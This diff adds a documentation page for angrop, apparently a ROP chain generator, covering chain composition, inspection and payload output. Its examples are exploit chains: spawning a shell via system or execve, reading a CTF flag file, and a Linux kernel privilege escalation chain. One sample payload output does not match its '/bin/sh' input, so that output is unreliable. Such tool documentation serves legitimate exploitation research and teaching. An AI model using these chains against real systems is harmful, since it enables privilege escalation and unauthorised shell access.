@@ -1,0 +1,306 @@
+---
+title: Building ROP Chains
+description: Learn how to compose and combine ROP chains using angrop's chain builder
+---
+
+Angrop automatically generates ROP chains by combining gadgets to achieve your desired operations. This guide covers how to build and compose chains effectively.
+
+## Chain Composition with the `+` Operator
+
+One of angrop's most powerful features is the ability to compose chains using the `+` operator. This allows you to build complex exploits step by step.
+
+### Basic Chain Composition
+
+```python
+import angr
+import angrop
+
+proj = angr.Project("/bin/bash")
+rop = proj.analyses.ROP()
+rop.find_gadgets()
+
+# Compose multiple operations into a single chain
+chain = rop.write_to_mem(0x61b100, b"/bin/sh\x00") + \
+        rop.func_call("system", [0x61b100])
+```
+
+### Multi-Step Exploit Example
+
+This example shows building a complete exploit chain that opens and reads a file:
+
+```python
+import os
+import angr
+import angrop
+
+proj = angr.Project("./vulnerable_binary")
+rop = proj.analyses.ROP()
+rop.find_gadgets()
+
+# Step 1: Write filename to memory
+chain = rop.write_to_mem(0x61b100, b"/home/ctf/flag\x00")
+
+# Step 2: Open the file
+chain += rop.func_call("open", [0x61b100, os.O_RDONLY])
+
+# Step 3: Read into a buffer
+chain += rop.func_call("read", [3, 0x61b200, 0x100])
+
+# Step 4: Write to stdout
+chain += rop.func_call("write", [1, 0x61b200, 0x100])
+```
+
+<Note>
+Each chain operation returns a `RopChain` object that can be combined with other chains using `+`. The resulting chain maintains all constraints and ensures correct execution order.
+</Note>
+
+## Real-World Example: Linux Kernel Escape
+
+This example from angrop's test suite demonstrates composing a sophisticated kernel privilege escalation chain:
+
+```python
+import angr
+import angrop
+
+proj = angr.Project("./vmlinux_sym")
+rop = proj.analyses.ROP(kernel_mode=True)
+rop.find_gadgets()
+
+init_cred = 0xffffffff8368b220
+init_nsproxy = 0xffffffff8368ad00
+
+# Build a multi-stage privilege escalation chain
+chain = rop.func_call("commit_creds", [init_cred]) + \
+        rop.func_call("find_task_by_vpid", [1]) + \
+        rop.move_regs(rdi='rax') + \
+        rop.set_regs(rsi=init_nsproxy, preserve_regs={'rdi'}) + \
+        rop.func_call("switch_task_namespaces", [], preserve_regs={'rdi', 'rsi'}) + \
+        rop.func_call('__x64_sys_fork', []) + \
+        rop.func_call('msleep', [0xffffffff])
+
+print(f"Total chain length: {len(chain)} bytes")
+```
+
+### Breaking Down the Chain
+
+Let's examine what each step accomplishes:
+
+<Steps>
+  <Step title="Escalate privileges">
+    ```python
+    rop.func_call("commit_creds", [init_cred])
+    ```
+    Calls `commit_creds()` with `init_cred` to gain root privileges.
+  </Step>
+
+  <Step title="Find init process">
+    ```python
+    rop.func_call("find_task_by_vpid", [1])
+    ```
+    Finds the init process (PID 1). The return value goes to `rax`.
+  </Step>
+
+  <Step title="Move return value to argument register">
+    ```python
+    rop.move_regs(rdi='rax')
+    ```
+    Moves the task struct pointer from `rax` to `rdi` for the next call.
+  </Step>
+
+  <Step title="Set up additional arguments">
+    ```python
+    rop.set_regs(rsi=init_nsproxy, preserve_regs={'rdi'})
+    ```
+    Sets `rsi` to `init_nsproxy` while preserving the `rdi` value we just set.
+  </Step>
+
+  <Step title="Switch namespaces">
+    ```python
+    rop.func_call("switch_task_namespaces", [], 
+                  preserve_regs={'rdi', 'rsi'})
+    ```
+    Calls the function using the preserved register values.
+  </Step>
+
+  <Step title="Fork and sleep">
+    ```python
+    rop.func_call('__x64_sys_fork', []) + \
+    rop.func_call('msleep', [0xffffffff])
+    ```
+    Creates a new process and sleeps to maintain the exploit.
+  </Step>
+</Steps>
+
+<Tip>
+When composing chains, use `preserve_regs` to maintain register values across multiple function calls. This is essential for passing return values or maintaining state.
+</Tip>
+
+## Chain Inspection and Debugging
+
+Angrop provides methods to inspect and debug your chains before using them:
+
+### Pretty-Print Chains
+
+```python
+chain = rop.set_regs(rax=0x1337, rbx=0x4141)
+chain.pp()
+```
+
+Output:
+```
+0x0000000000410b23: pop rax; ret 
+                    0x1337
+0x0000000000404dc0: pop rbx; ret 
+                    0x4141
+```
+
+### Generate Exploit Code
+
+```python
+chain = rop.write_to_mem(0x61b100, b"/bin/sh\x00")
+chain.print_payload_code()
+```
+
+Output:
+```python
+chain = b""
+chain += p64(0x410b23)  # pop rax; ret
+chain += p64(0x74632f656d6f682f)
+chain += p64(0x404dc0)  # pop rbx; ret
+chain += p64(0x61b0f8)
+chain += p64(0x40ab63)  # mov qword ptr [rbx + 8], rax; add rsp, 0x10; pop rbx; ret
+...
+```
+
+### Get Raw Bytes
+
+```python
+chain = rop.set_regs(rax=0x1337)
+payload = chain.payload_str()
+print(f"Chain length: {len(payload)} bytes")
+print(f"Payload: {payload.hex()}")
+```
+
+## Incremental Chain Building
+
+You can build chains incrementally, adding operations as needed:
+
+```python
+import angr
+import angrop
+
+proj = angr.Project("./binary")
+rop = proj.analyses.ROP()
+rop.find_gadgets()
+
+# Start with an empty chain
+chain = rop.set_regs()  # Returns empty chain
+
+# Add operations conditionally
+if need_setup:
+    chain += rop.write_to_mem(buffer_addr, data)
+
+if use_syscall:
+    chain += rop.do_syscall(59, [bin_sh_addr, 0, 0])
+else:
+    chain += rop.func_call("system", [bin_sh_addr])
+
+# Add cleanup if needed
+if needs_cleanup:
+    chain += rop.func_call("exit", [0])
+```
+
+## Chain Optimization
+
+Angrop automatically optimizes chains during generation, but you can influence the process:
+
+### Minimize Stack Usage
+
+```python
+# Angrop automatically selects gadgets with minimal stack changes
+chain = rop.set_regs(rax=0x1337, rbx=0x4141, rcx=0x5678)
+
+# You can verify stack usage
+print(f"Total stack change: {sum(g.stack_change for g in chain._gadgets)} bytes")
+```
+
+### Avoid Register Clobbering
+
+```python
+# Use preserve_regs to prevent overwriting important values
+chain = rop.set_regs(rax=0x1337)
+chain += rop.set_regs(rbx=0x4141, preserve_regs={'rax'})
+
+# The 'rax' value is maintained across operations
+```
+
+## Error Handling
+
+When chain building fails, angrop raises `RopException` with details:
+
+```python
+from angrop.errors import RopException
+
+try:
+    # Try to set a register that might not be settable
+    chain = rop.set_regs(r15=0x1337)
+except RopException as e:
+    print(f"Failed to build chain: {e}")
+    # Fall back to alternative approach
+    chain = rop.move_regs(r15='rax') + rop.set_regs(rax=0x1337)
+```
+
+## Advanced Composition Patterns
+
+### Conditional Chains
+
+```python
+def build_exploit_chain(use_execve=False):
+    chain = rop.write_to_mem(0x61b100, b"/bin/sh\x00")
+    
+    if use_execve:
+        # Use execve syscall
+        chain += rop.execve(path_addr=0x61b100)
+    else:
+        # Use system() function
+        chain += rop.func_call("system", [0x61b100])
+    
+    return chain
+
+# Build different variants
+syscall_chain = build_exploit_chain(use_execve=True)
+function_chain = build_exploit_chain(use_execve=False)
+```
+
+### Repeated Operations
+
+```python
+# Write multiple strings
+strings = [b"flag.txt\x00", b"secret\x00", b"key\x00"]
+base_addr = 0x61b000
+
+chain = rop.set_regs()  # Empty chain
+for i, s in enumerate(strings):
+    addr = base_addr + (i * 0x100)
+    chain += rop.write_to_mem(addr, s)
+```
+
+<Tip>
+When building large chains, consider breaking them into logical sections and testing each section independently before composing the final exploit.
+</Tip>
+
+## Performance Considerations
+
+- **Chain length**: Longer chains may take more time to generate due to constraint solving
+- **Preserve registers**: Using `preserve_regs` adds constraints and may limit available gadgets
+- **Badbytes**: More badbytes increase chain generation complexity
+- **Optimization**: The initial `find_gadgets(optimize=True)` enables better chain composition
+
+## Next Steps
+
+Now that you understand chain composition, explore specific operations:
+
+- [Register Operations](/guides/register-operations) - Setting and moving registers
+- [Memory Operations](/guides/memory-operations) - Writing and modifying memory
+- [Function Calls](/guides/function-calls) - Calling functions with arguments
+- [Syscalls](/guides/syscalls) - Making system calls
